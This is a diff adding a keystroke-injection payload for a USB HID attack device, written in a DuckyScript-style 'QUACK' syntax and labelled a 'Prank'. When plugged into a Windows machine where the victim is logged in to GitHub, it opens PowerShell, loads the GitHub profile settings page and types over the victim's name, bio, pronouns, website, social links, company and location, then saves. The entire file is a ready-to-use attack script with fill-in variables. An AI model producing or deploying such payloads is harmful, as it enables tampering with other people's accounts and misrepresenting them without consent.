@@ -1,0 +1,117 @@
+* REM ###################################################
+* REM #                                                 #
+* REM # Title        : Change Github Profile Settings   #
+* REM # Author       : Aleff                            #
+* REM # Version      : 1.0                              #
+* REM # Category     : Prank                            #
+* REM # Target       : Windows 10/11                    #
+* REM #                                                 #
+* REM ###################################################
+
+ATTACKMODE HID
+
+QUACK REM REQUIREMENTS
+* REM Internet connection
+* REM Logged in Github
+
+QUACK REM VARIABLES
+* REM 1) Here you should define the new name
+USERNAME='example'
+* REM 2) Here you should define the new Biography
+BIO='example'
+* REM 3) Here you should define the custom pronouns
+CUSTOM-PRONOUNS='example'
+* REM 4) Here you should define the new personal website url
+URL='example'
+* REM 5) Here you should define the new social network links
+SOCIAL-ACCOUNT-1='example'
+SOCIAL-ACCOUNT-2='example'
+SOCIAL-ACCOUNT-3='example'
+SOCIAL-ACCOUNT-4='example'
+* REM 6) Here you should define the new company
+COMPANY='example'
+* REM 7) Here you should define the new location
+LOCATION='example'
+
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 500
+
+QUACK STRING Start-Process \"https://github.com/settings/profile\"; exit;
+QUACK ENTER
+* REM It depends by the computer power and by the internet connection power
+QUACK DELAY 2000
+
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK STRING $USERNAME
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK STRING $BIO
+QUACK TAB
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK STRING $CUSTOM-PRONOUNS
+QUACK TAB
+QUACK STRING $URL
+QUACK TAB
+QUACK STRING $SOCIAL-ACCOUNT-1
+QUACK TAB
+QUACK STRING $SOCIAL-ACCOUNT-2
+QUACK TAB
+QUACK STRING $SOCIAL-ACCOUNT-3
+QUACK TAB
+QUACK STRING $SOCIAL-ACCOUNT-4
+QUACK TAB
+QUACK STRING $COMPANY
+QUACK TAB
+QUACK STRING $LOCATION
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK ENTER
+QUACK DELAY 2000
+QUACK ALT-F4
